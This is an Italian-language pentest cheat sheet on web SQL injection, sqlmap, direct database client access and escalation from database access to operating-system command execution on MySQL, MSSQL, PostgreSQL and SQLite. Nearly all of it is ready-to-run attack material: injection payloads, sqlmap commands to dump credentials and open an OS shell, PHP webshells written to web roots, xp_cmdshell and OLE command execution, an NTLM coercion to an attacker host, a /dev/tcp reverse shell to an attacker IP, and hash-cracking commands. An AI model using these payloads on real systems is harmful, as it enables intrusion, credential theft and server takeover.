Master Guide: Web SQL Injection, Enumerazione e Database Privilege EscalationGuida operativa completa per l'identificazione di SQL Injection (SQLi) sul Web, lo sfruttamento automatizzato tramite sqlmap, l'interazione manuale CLI con i server MySQL, MSSQL, PostgreSQL e SQLite, l'enumerazione avanzata delle configurazioni e le tecniche di Privilege Escalation / Remote Code Execution (RCE).SECTION 1: Web SQL Injection — Riconoscimento & Testing ManualePrima di lanciare strumenti automatizzati, è fondamentale testare manualmente i parametri HTTP (GET, POST, Headers, Cookies) per identificare il comportamento del database e la tipologia di injection.1.1 Test Rapidi di IdentificazioneInietta i seguenti payload nei parametri sospetti (es. http://target/item.php?id=1):# 1. Syntax Error Testing (Verifica risposta del DB)
?id=1'                  # Genera errore SQL? -> Altamente probabile SQLi
?id=1"                  # Genera errore con doppi apici?
?id=1' -- -             # L'errore sparisce? -> Convalida del commento SQL (MySQL/PostgreSQL)
?id=1' /*               # Alternative comment format

# 2. Boolean-based Blind Testing (Verifica logica applicativa)
?id=1 AND 1=1           # Pagina carica normalmente
?id=1 AND 1=2           # Pagina vuota, diversa o errore 404 -> Iniezione Booleana confermata

# 3. Time-based Blind Testing (Verifica ritardi nella risposta)
?id=1 AND SLEEP(5) -- -                         # MySQL / MariaDB
?id=1; WAITFOR DELAY '0:0:5' --                 # MSSQL
?id=1 AND pg_sleep(5) --                        # PostgreSQL
1.2 Union-based SQL Injection (Estrazione Dati Manuale)Quando i dati restituiti dal DB sono stampati a video nell'HTML:-- Step A: Determinare il numero di colonne
?id=-1 ORDER BY 1 -- -
?id=-1 ORDER BY 2 -- -
?id=-1 ORDER BY N -- -  -- Incrementa finché non dà errore

-- Step B: Trovare le colonne visibili (riflesse sulla pagina)
?id=-1 UNION SELECT 1, 2, 3, 4 -- -

-- Step C: Estrarre informazioni di sistema (sulla colonna riflessa, es. 2 e 3)
?id=-1 UNION SELECT 1, version(), user(), 4 -- -             -- MySQL / MariaDB
?id=-1 UNION SELECT 1, @@version, SYSTEM_USER, 4 -- -        -- MSSQL
?id=-1 UNION SELECT 1, version(), current_user, 4 -- -       -- PostgreSQL
SECTION 2: Automated Exploitation con sqlmapsqlmap è lo standard per automatizzare il rilevamento, l'estrazione dati e l'ottenimento di shell di sistema.2.1 Workflow Standard (A Scendere di Livello)Il flusso tipico segue la gerarchia: Database → Tabelle → Colonne → Dump dei Dati.# 1. Identifica vulnerabilità e elenca i Database
sqlmap -u "http://<IP_TARGET>/pagina.php?param=1" --dbs --batch

# 2. Elenca le Tabelle del database target
sqlmap -u "http://<IP_TARGET>/pagina.php?param=1" -D <NOME_DB> --tables --batch

# 3. Elenca le Colonne di una tabella critica (es. users)
sqlmap -u "http://<IP_TARGET>/pagina.php?param=1" -D <NOME_DB> -T <TABELLA> --columns --batch

# 4. Dump dei Dati di colonne specifiche (es. credenziali)
sqlmap -u "http://<IP_TARGET>/pagina.php?param=1" -D <NOME_DB> -T <TABELLA> -C user_login,user_pass --dump --batch
Nota: --batch accetta automaticamente le risposte predefinite. Per CMS noti, cerca tabelle come wp_users (WordPress), users, accounts, admin_credentials.2.2 Tabella Opzioni Essenziali di sqlmapOpzioneDescrizione / Scopo-u "URL"URL target con il parametro da testare (sempre tra virgolette)-r req.txtCarica una richiesta HTTP grezza da file (es. salvata da Burp Suite)--data="a=1&b=2"Specifica dati inviati in POST-p <param>Forza il test solo ed esclusivamente sul parametro indicato--cookie="PHPSESSID=..."Utilizza cookie per pagine protette da autenticazione--dbs / --tables / --columnsEnumera Database / Tabelle / Colonne-D / -T / -CSeleziona il Database / Tabella / Colonne specifiche--dumpEstrae i dati della selezione corrente--dump-allScarica l'intero contenuto del DB (Usare con cautela su DB grandi)--batchModalità non-interattiva automatica--level=5 --risk=3Livello di profondità e aggressività massimo dei payload--dbms=<name>Specifica il motore DB (es. mysql, mssql, postgresql) per velocizzare--technique=BEUSTQFiltra tecniche: Boolean, Error, Union, Stacked, Time, Query--threads=5Aumenta il numero di thread concorrenti (max 10)--random-agentUtilizza un User-Agent HTTP casuale--proxy=http://127.0.0.1:8080Canalizza il traffico attraverso Burp Suite2.3 Opzioni Avanzate & Direct Shells via sqlmap# 1. Shell interattiva SQL direttamente dal terminale
sqlmap -u "..." --sql-shell

# 2. Esecuzione di una query SQL arbitraria singola
sqlmap -u "..." --sql-query "SELECT user(), version()"

# 3. Lettura di file remoti (richiede privilegi FILE / DBA)
sqlmap -u "..." --file-read="/etc/passwd"
sqlmap -u "..." --file-read="C:/Windows/win.ini"

# 4. Scrittura di file remoti / WebShell
sqlmap -u "..." --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# 5. Tentativo di RCE e Shell OS Interattiva
sqlmap -u "..." --os-shell
SECTION 3: Connessione Diretta & Interazione CLI ai DBMSSe si ottengono credenziali durante l'enumerazione o l'accesso a una shell locale sul target, è possibile interagire direttamente con i client CLI dei vari database.3.1 MySQL / MariaDBWindows (cmd.exe / PowerShell)# Comando singolo non-interattivo
.\mysql.exe -u <USER> -p"<PASSWORD>" -h 127.0.0.1 -P 3306 -e "<QUERY_SQL>"

# Prompt interattivo
.\mysql.exe -u <USER> -p"<PASSWORD>" -h 127.0.0.1 -P 3306 <NOME_DB>
Linux# Comando singolo (Output pulito senza tabelle grafiche)
mysql -u <USER> -p'<PASSWORD>' -h 127.0.0.1 -P 3306 -B -N -e "<QUERY_SQL>"

# Connessione locale tramite Unix Socket (spesso come root/sudo)
sudo mysql
sudo mariadb
3.2 Microsoft SQL Server (MSSQL)Da Linux (Impacket / Sqsh)# Con Impacket mssqlclient (Consigliato)
impacket-mssqlclient <USER>:'<PASSWORD>'@<IP_TARGET>
impacket-mssqlclient <DOMINIO>/<USER>:'<PASSWORD>'@<IP_TARGET> -windows-auth

# Con Sqsh
sqsh -S <IP_TARGET> -U <USER> -P '<PASSWORD>'
Da Windows (sqlcmd.exe / PowerShell):: Windows Authentication (Autenticazione integrata del dominio/utente corrente)
sqlcmd -S 127.0.0.1 -E

:: SQL Server Authentication (Username e Password espliciti)
sqlcmd -S 127.0.0.1 -U <USER> -P '<PASSWORD>' -Q "<QUERY_SQL>"
3.3 PostgreSQL# Connessione interattiva
psql -h 127.0.0.1 -U <USER> -d <NOME_DB>

# Esecuzione comando singolo
psql -h 127.0.0.1 -U <USER> -d <NOME_DB> -c "<QUERY_SQL>"

# Connessione locale come utente del sistema OS 'postgres'
sudo -u postgres psql
3.4 SQLite# Connessione / Apertura file di database locale
sqlite3 /percorso/del/database.db

# Esecuzione query diretta da terminale
sqlite3 /percorso/del/database.db "SELECT * FROM users;"
SECTION 4: Enumerazione Manuale Avanzata dei DatabaseUna volta connessi al DBMS (via CLI o via --sql-shell), l'obiettivo è misurare l'estensione dei privilegi ed identificare misconfiguration di sicurezza.4.1 Matrice Comparativa di Enumerazione RapidaInformazione da EstrarreMySQL / MariaDBMSSQLPostgreSQLSQLiteVersione DB & OSSELECT @@version;SELECT @@version;SELECT version();SELECT sqlite_version();Utente CorrenteSELECT USER();SELECT SYSTEM_USER;SELECT current_user;N/A (Accesso al File)Privilegi UtenteSHOW GRANTS;SELECT * FROM fn_my_permissions(NULL, 'SERVER');SELECT * FROM session_user;Legati al file OSCheck Admin/SuperuserSELECT File_priv, Super_priv FROM mysql.user WHERE user=USER();SELECT IS_SRVROLEMEMBER('sysadmin');SELECT usesuper FROM pg_user WHERE usename = current_user;N/ADirectory Plugins/ExtSHOW VARIABLES LIKE 'plugin_dir';N/A (Assemblies/DLL)SHOW dynamic_library_path;N/ARestrizione Scrittura FileSHOW VARIABLES LIKE 'secure_file_priv';Permessi utente del servizio WindowsPermessi utente OS postgresPermessi sul file DB4.2 Query Utili di Enumerazione DettagliataQuery Generiche MySQL / MariaDB:SHOW DATABASES;
USE <NOME_DB>;
SHOW TABLES;
DESCRIBE <TABELLA>;
SELECT user, host, password FROM mysql.user;       -- Estrazione Hash Utenti (per versioni vecchie)
SELECT user, host, authentication_string FROM mysql.user; -- Estrazione Hash Utenti (MySQL 5.7+)
Query Generiche MSSQL:SELECT name FROM sys.databases;
SELECT name FROM sys.tables;
SELECT IS_SRVROLEMEMBER('sysadmin');               -- 1 = Utente corrente è Sysadmin
SELECT name, is_trustworthy_on FROM sys.databases; -- Check Database Trustworthy
EXEC sp_linkedservers;                              -- Enumera Server Collegati
SECTION 5: Vulnerabilità Server & Privilege Escalation (Post-Exploitation)Questa sezione dettaglia i vettori per trasformare l'accesso al Database in Remote Code Execution (RCE) o Privilege Escalation sul sistema operativo ospitante.5.1 Vettori per MySQL / MariaDBVettore A1: UDF (User Defined Functions) Code ExecutionRequisiti: Utente DB con File_priv = 'Y' o privilegio root. La variabile secure_file_priv deve essere vuota ("") oppure la cartella plugin_dir deve essere scrivibile.Funzionamento: Caricamento di una libreria dinamica compilata (.dll per Windows, .so per Linux) nella directory dei plugin per eseguire comandi di sistema con le autorizzazioni del servizio MySQL (spesso NT AUTHORITY\SYSTEM o root).-- 0. Trova la libreria lib_mysqludf_sys_64.dll
cat /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll

-- 1. Verifica architettura e percorsi dei plugin
SHOW VARIABLES LIKE '%version_compile_machine%'; -- x86_64 o x86
SHOW VARIABLES LIKE 'plugin_dir';                 -- es. C:\MySQL\lib\plugin\

-- 2. Caricamento della funzione personalizzata da DLL/SO malevola
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';

-- 3. Esecuzione comandi OS a livello SYSTEM/Root
SELECT sys_eval('whoami');
SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');
SELECT sys_eval('cmd.exe /c net user pwned Password123! /add');

-- 4. Cleanup
DROP FUNCTION sys_eval;
Vettore A2: WebShell Injection (INTO OUTFILE)Requisiti: File_priv = 'Y', secure_file_priv = "" e permessi di scrittura sulla Web Root dell'applicazione.SELECT '<?php system($_REQUEST["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
SELECT '<?php system($_REQUEST["cmd"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';
Vettore A3: Lettura File Arbitrari (LOAD_FILE)SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:/Windows/win.ini');
5.2 Vettori per Microsoft SQL Server (MSSQL)Vettore B1: Direct RCE via xp_cmdshellRequisiti: Ruolo sysadmin.-- 1. Abilitazione opzioni avanzate e attivazione di xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 2. Esecuzione comandi di sistema
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';
Vettore B2: OLE Automation Procedures (sp_OACreate)Requisiti: Permessi sysadmin (Bypass qualora xp_cmdshell sia bloccato o rilevato dall'EDR).EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

DECLARE @myshell INT;
EXEC sp_OACreate 'WScript.Shell', @myshell OUT;
EXEC sp_OAMethod @myshell, 'Run', NULL, 'cmd.exe /c whoami > C:\Windows\Temp\out.txt';
Vettore B3: PrivEsc via Database TRUSTWORTHY & ImpersonazioneRequisiti: L'utente DB corrente è proprietario (dbo) di un database con flag TRUSTWORTHY ON, ed il sysadmin è impostato come Server Principal.-- 1. Controlla i database con TRUSTWORTHY abilitato
SELECT name, is_trustworthy_on FROM sys.databases WHERE is_trustworthy_on = 1;

-- 2. Elevazione dei privilegi a sysadmin impersonando il DBO
USE <DATABASE_TRUSTWORTHY>;
EXECUTE AS USER = 'dbo';
EXEC sp_addsrvrolemember 'nostro_utente', 'sysadmin';
REVERT;
Vettore B4: Abuso di Linked Servers (Cross-Server Exploitation)Requisiti: Presenza di un server MSSQL esterno collegato in trust tramite sp_addlinkedserver.-- 1. Elenca i server collegati
EXEC sp_linkedservers;

-- 2. Esegue comandi RCE sul server remoto tramite la relazione di trust
SELECT * FROM OPENQUERY("[SERVER_REMOTOMSSQL]", 'SELECT @@version; EXEC xp_cmdshell ''whoami'';');
Vettore B5: Coercizione Autenticazione NTLM (xp_dirtree)Requisiti: Qualsiasi utente SQL (anche privo di privilegi elevati).-- Costringe il server MSSQL ad effettuare un handshake SMB verso l'attaccante per catturare l'hash NetNTLMv2 (via Responder)
EXEC master..xp_dirtree '\\<IP_ATTACCANTE_RESPONDER>\share';
5.3 Vettori per PostgreSQLVettore C1: Command Execution via COPY ... FROM PROGRAMRequisiti: Ruolo di superuser (Disponibile nativamente su PostgreSQL 9.3+).-- 1. Creazione tabella temporanea ed esecuzione del comando OS
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'whoami';
SELECT * FROM cmd_exec;

-- 2. Reverse Shell diretta
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<IP_ATTACCANTE>/4444 0>&1"';
Vettore C2: Arbitrary File Read/Write tramite Large Objects (lo_export / lo_import)Requisiti: Ruolo superuser o appartenenza ai gruppi pg_read_server_files / pg_write_server_files.-- Lettura file dal sistema
CREATE TABLE largetable (loid oid);
SELECT lo_import('/etc/passwd') AS loid \gset
SELECT lo_get(:loid);

-- Scrittura WebShell su disco
SELECT lo_from_bytea(0, '\x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e'); -- <?php system($_GET["cmd"]); ?>
SELECT lo_export(loid, '/var/www/html/shell.php') FROM largetable;
5.4 Vettori per SQLiteVettore D1: WebShell Overwrite tramite ATTACH DATABASERequisiti: Iniezione SQL su applicazione che usa SQLite con permessi di scrittura nella cartella della Web Root.ATTACH DATABASE '/var/www/html/shell.php' AS pwn;
CREATE TABLE pwn.exploit (data text);
INSERT INTO pwn.exploit VALUES ('<?php system($_GET["cmd"]); ?>');
SECTION 6: Matrice Decisionale, Tips Operativi & Hash Cracking6.1 Matrice Decisionale: Esito Enumerazione vs Vettore di Attacco+-------------------+-----------------------------------+-------------------------------------+
| DBMS Target       | Condizione Riscontrata            | Vettore di Attacco Principale       |
+-------------------+-----------------------------------+-------------------------------------+
| MySQL / MariaDB   | File_priv = Y &                   | UDF Code Execution (RCE) /          |
|                   | secure_file_priv = ""             | WebShell via INTO OUTFILE           |
+-------------------+-----------------------------------+-------------------------------------+
| MySQL / MariaDB   | File_priv = Y &                   | UDF via DLL/SO Hijacking            |
|                   | plugin_dir Scrivibile             | nella directory dei plugin          |
+-------------------+-----------------------------------+-------------------------------------+
| MSSQL             | Ruolo sysadmin                    | Direct RCE tramite xp_cmdshell      |
|                   |                                   | o OLE Automation Procedures         |
+-------------------+-----------------------------------+-------------------------------------+
| MSSQL             | TRUSTWORTHY ON &                  | Escalation a sysadmin tramite       |
|                   | Utente DBO                        | EXECUTE AS USER = 'dbo'             |
+-------------------+-----------------------------------+-------------------------------------+
| MSSQL             | Server Collegati (Linked Servers) | Cross-Server RCE via OPENQUERY      |
+-------------------+-----------------------------------+-------------------------------------+
| PostgreSQL        | Permessi Superuser (PG >= 9.3)    | RCE diretto tramite                 |
|                   |                                   | COPY ... FROM PROGRAM               |
+-------------------+-----------------------------------+-------------------------------------+
6.2 Cheat Sheet & Tips Operativi per PentestGestione Sessioni e Cache sqlmap:I risultati delle scansioni vengono memorizzati in ~/.local/share/sqlmap/output/<TARGET_IP>/.Se desideri ripartire da zero eliminando la cache di test precedenti: usa la flag --flush-session.Cracking Credenziali Estratte:WordPress: Gli hash estrai da wp_users.user_pass utilizzano l'algoritmo phpass ($P$...).Hashcat: hashcat -m 400 hash.txt wordlist.txtJohn the Ripper: john --format=phpass hash.txt --wordlist=wordlist.txtMySQL / MariaDB:Hash MySQL v4.1+ (*HASH...): hashcat -m 300Hash MySQL SHA256 / caching_sha2_password: hashcat -m 24100Inizio Scansione & HTTP Headers:Racchiudi sempre l'URL tra virgolette (-u "http://...") in sqlmap per evitare che la shell interpreti i caratteri speciali & e ?.Se la richiesta HTTP coinvolge parametri in POST o header complessi (Authentication, Cookie, JSON), esporta la richiesta raw da Burp Suite in un file req.txt ed usa:sqlmap -r req.txt --batch
